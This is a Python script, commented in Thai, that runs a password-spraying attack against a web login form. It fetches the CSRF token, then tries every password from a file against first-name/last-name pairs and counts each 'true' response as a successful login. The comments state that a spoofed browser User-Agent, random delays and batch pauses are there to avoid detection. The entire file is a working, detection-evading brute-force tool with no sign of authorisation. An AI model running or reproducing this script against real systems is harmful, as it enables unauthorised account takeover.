import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import os
import time
import random

# 1. โหลด environment variables
load_dotenv()

# 2. กำหนด URL จาก .env
base_url = os.getenv('BASE_URL')
login_url = f"{base_url}{os.getenv('LOGIN_URL')}"

print(f"🌐 ใช้ URL: {base_url}")
print("-" * 50)

# 3. เริ่ม session เพื่อเก็บ cookies
session = requests.Session()

# ใช้ User-Agent แบบง่ายๆ เพื่อหลีกเลี่ยงการตรวจจับ
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
})

# 4. โหลดหน้า login เพื่อนำ CSRF Token
try:
    response = session.get(login_url)
    print(f"📊 Status Code: {response.status_code}")
    print(f"📍 Final URL: {response.url}")
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # 5. ดึง CSRF Token จาก input hidden
    csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
    if not csrf_input:
        print("❌ ไม่พบ CSRF Token ในหน้า login")
        print("🔍 กำลังตรวจสอบ HTML structure...")
        
        # แสดง input fields ทั้งหมดเพื่อ debug
        all_inputs = soup.find_all('input')
        print(f"พบ input fields จำนวน: {len(all_inputs)}")
        for i, input_field in enumerate(all_inputs, 1):
            input_name = input_field.get('name', 'ไม่มีชื่อ')
            input_type = input_field.get('type', 'text')
            print(f"   {i}. Name: {input_name}, Type: {input_type}")
        
        # บันทึก HTML ลงไฟล์เพื่อตรวจสอบ
        with open('debug_response.html', 'w', encoding='utf-8') as f:
            f.write(response.text)
        print("💾 บันทึก HTML ลงไฟล์ debug_response.html แล้ว")
        
        exit()
        
    csrf_token = csrf_input['value']
    print(f"🔑 CSRF Token ที่ได้: {csrf_token}")
    
except Exception as e:
    print(f"❌ เกิดข้อผิดพลาดในการโหลดหน้า login: {e}")
    print("🔍 กำลังตรวจสอบ response...")
    
    if 'response' in locals():
        print(f"Status Code: {response.status_code}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Text (first 500 chars): {response.text[:500]}")
    
    exit()

# 6. อ่านข้อมูลจากไฟล์
def read_file_lines(filename):
    """อ่านข้อมูลจากไฟล์และคืนค่าเป็น list"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"❌ ไม่พบไฟล์ {filename}")
        return []

# อ่านข้อมูลจากไฟล์
fnames = read_file_lines('fname.txt')
lnames = read_file_lines('lname.txt')
passwords = read_file_lines('password.txt')

if not fnames or not lnames or not passwords:
    print("❌ ไม่สามารถอ่านข้อมูลจากไฟล์ได้")
    exit()

print(f"📊 ข้อมูลที่โหลดได้:")
print(f"   - ชื่อ: {len(fnames)} รายการ")
print(f"   - นามสกุล: {len(lnames)} รายการ") 
print(f"   - รหัสผ่าน: {len(passwords)} รายการ")
print(f"   - รวมการทดสอบ: {len([f + l for f, l in zip(fnames, lnames)]) * len(passwords)} รายการ")
print("-" * 50)

# 7. วนลูปทดสอบข้อมูลจากไฟล์
attempt_count = 0
success_count = 0

# ตั้งค่าการหน่วงเวลา
MIN_DELAY = 1.0  # หน่วงขั้นต่ำ 1 วินาที
MAX_DELAY = 3.0  # หน่วงสูงสุด 3 วินาที
BATCH_SIZE = 5   # ทดสอบ 5 ครั้งแล้วหยุดพักนาน
BATCH_DELAY = 5.0  # หยุดพัก 5 วินาทีหลังทดสอบ 5 ครั้ง

# เริ่มที่ password ก่อน (outer loop)
for password in passwords:
    print(f"\n🔐 ทดสอบรหัสผ่าน: {password}")
    print("=" * 40)
    
    # fname และ lname ต้องสัมพันธ์กัน (แถวที่ 1 คู่กับแถวที่ 1)
    for i in range(len(fnames)):
        if i < len(lnames):  # ตรวจสอบว่ามี lname ครบหรือไม่
            fname = fnames[i]
            lname = lnames[i]
            attempt_count += 1
            
            # ตรวจสอบการหยุดพักหลังทดสอบหลายครั้ง
            if attempt_count % BATCH_SIZE == 0:
                print(f"🛑 หยุดพักหลังทดสอบ {BATCH_SIZE} ครั้ง...")
                print(f"⏳ หน่วงเวลา {BATCH_DELAY} วินาที...")
                time.sleep(BATCH_DELAY)
                print("▶️ เริ่มทดสอบต่อ...")
                print("-" * 30)
            
            print(f"🔍 ทดสอบครั้งที่ {attempt_count}: {fname} {lname} / {password}")
            
            # เตรียมข้อมูลสำหรับ POST
            login_data = {
                '__RequestVerificationToken': csrf_token,
                'fname': fname,
                'lname': lname,
                'password': password
            }
            
            # ส่ง POST ไปยังฟอร์ม login
            post_response = session.post(login_url, data=login_data)
            
            # ตรวจสอบผลลัพธ์
            if post_response.text.strip().lower() == "true":
                print("✅ Login สำเร็จ (ระบบตอบ true)")
                success_count += 1
            else:
                print("❌ Login ล้มเหลว (ระบบตอบ false)")
            
            # หยุดพักเล็กน้อยเพื่อไม่ให้ server รับภาระมากเกินไป
            # ใช้เวลาหน่วงแบบสุ่มเพื่อหลีกเลี่ยงการตรวจจับ
            delay = random.uniform(MIN_DELAY, MAX_DELAY)  # หน่วง 2-5 วินาที
            print(f"⏳ หน่วงเวลา {delay:.1f} วินาที...")
            time.sleep(delay)
            print("-" * 30)

# 8. สรุปผลลัพธ์
print("\n" + "=" * 50)
print("📈 สรุปผลการทดสอบ:")
print(f"   - จำนวนครั้งที่ทดสอบ: {attempt_count}")
print(f"   - จำนวนครั้งที่สำเร็จ: {success_count}")
print(f"   - จำนวนครั้งที่ล้มเหลว: {attempt_count - success_count}")
print("=" * 50)
print("🎯 การทดสอบเสร็จสิ้น!")